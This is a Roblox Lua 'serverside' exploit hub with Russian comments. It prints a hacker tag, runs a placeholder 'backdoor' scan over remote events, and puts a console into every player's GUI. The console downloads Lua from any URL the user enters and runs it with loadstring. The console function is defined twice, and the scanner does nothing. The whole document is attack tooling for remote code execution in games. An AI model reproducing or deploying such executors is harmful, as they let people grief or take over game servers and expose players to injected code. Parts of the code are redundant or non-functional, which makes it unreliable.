print("c00lkidd214anzz serverside LOL")

-- c00lkidd214anzz ServerSide Hub | Scanner + Executor
print("c00lkidd214anzz serverside LOL")

local Players = game:GetService("Players")

-- 1. Твой сканер бэкдоров (упрощенный вывод)
local function ScanServer()
    warn("c00lkidd214anzz Backdoor: Scanning...")
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            -- Можно добавить логику фильтрации, если нужно
        end
    end
    warn("c00lkidd214anzz Backdoor: Scan Complete!")
end

-- 2. Интерфейс консоли
local function CreateConsoleGui(player)
    local screen = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
    screen.Name = "C00lkiddConsole"
    
    local frame = Instance.new("Frame", screen)
    frame.Size = UDim2.new(0, 300, 0, 200)
    frame.Position = UDim2.new(0.5, -150, 0.3, 0)
    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    frame.BorderSizePixel = 0
    frame.Active = true; frame.Draggable = true
    
    local title = Instance.new("TextLabel", frame)
    title.Size = UDim2.new(1, 0, 0, 30)
    title.Text = "c00lkidd214anzz Console"
    title.TextColor3 = Color3.new(1, 1, 1)
    title.BackgroundTransparency = 1
    
    local input = Instance.new("TextBox", frame)
    input.Size = UDim2.new(0.9, 0, 0, 40)
    input.Position = UDim2.new(0.05, 0, 0.3, 0)
    input.PlaceholderText = "Вставь ссылку на .lua скрипт..."
    
    local btn = Instance.new("TextButton", frame)
    btn.Size = UDim2.new(0.9, 0, 0, 40)
    btn.Position = UDim2.new(0.05, 0, 0.6, 0)
    btn.Text = "EXECUTE SERVER SCRIPT"
    btn.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
    
    btn.MouseButton1Click:Connect(function()
        local url = input.Text
        local success, err = pcall(function()
            local code = game:HttpGet(url)
            loadstring(code)()
        end)
        
        if success then
            print("Скрипт выполнен успешно!")
        else
            warn("Ошибка: " .. tostring(err))
        end
    end)
end

-- Запуск всего сразу
ScanServer()
for _, p in pairs(Players:GetPlayers()) do
    CreateConsoleGui(p)
end
-- КОНСОЛЬ ДЛЯ ЗАПУСКА СКРИПТОВ
local function CreateConsoleGui()
    local Players = game:GetService("Players")
    local player = Players.LocalPlayer
    if not player then return end
    
    local screen = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
    screen.Name = "C00lkiddConsole"
    
    local frame = Instance.new("Frame", screen)
    frame.Size = UDim2.new(0, 300, 0, 150)
    frame.Position = UDim2.new(0.5, -150, 0.4, 0)
    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    frame.Active = true; frame.Draggable = true
    
    local input = Instance.new("TextBox", frame)
    input.Size = UDim2.new(0.9, 0, 0, 40)
    input.Position = UDim2.new(0.05, 0, 0.2, 0)
    input.PlaceholderText = "Вставь ссылку на скрипт..."
    
    local btn = Instance.new("TextButton", frame)
    btn.Size = UDim2.new(0.9, 0, 0, 40)
    btn.Position = UDim2.new(0.05, 0, 0.6, 0)
    btn.Text = "EXECUTE"
    btn.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
    
    btn.MouseButton1Click:Connect(function()
        local url = input.Text
        local s, e = pcall(function() loadstring(game:HttpGet(url))() end)
        if not s then warn("Ошибка: " .. tostring(e)) end
    end)
end

-- Запуск консоли
CreateConsoleGui()
